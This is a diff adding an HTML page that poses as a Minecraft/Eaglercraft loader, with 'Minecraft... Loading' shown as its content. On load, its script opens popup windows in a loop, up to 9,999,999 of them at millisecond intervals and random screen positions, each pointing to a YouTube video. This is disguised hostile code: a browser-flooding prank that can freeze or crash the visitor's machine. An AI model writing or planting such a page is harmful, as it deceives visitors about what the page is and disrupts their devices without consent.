@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>eaglercraft</title>
+    <script>
+        function openWindows(url, numberOfWindows, interval) {
+            let count = 0;
+
+            function openWindow() {
+                if (count < numberOfWindows) {
+                   
+                    const screenWidth = window.screen.availWidth;
+                    const screenHeight = window.screen.availHeight;
+                    const windowWidth = 800; 
+                    const windowHeight = 600; 
+
+                    const left = Math.floor(Math.random() * (screenWidth - windowWidth));
+                    const top = Math.floor(Math.random() * (screenHeight - windowHeight));
+
+                   
+                    window.open(url, '_blank', `width=${windowWidth},height=${windowHeight},left=${left},top=${top}`);
+                    count++;
+                    setTimeout(openWindow, interval);
+                }
+            }
+
+            openWindow();
+        }
+
+        window.onload = function() {
+            const url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; 
+            const windowsPerSecond = 200; 
+            const interval = 10 / windowsPerSecond; 
+
+            openWindows(url, 9999999, interval); 
+        };
+    </script>
+</head>
+<body>
+    <h1>Minecraft... Loading</h1>
+</body>
+</html>
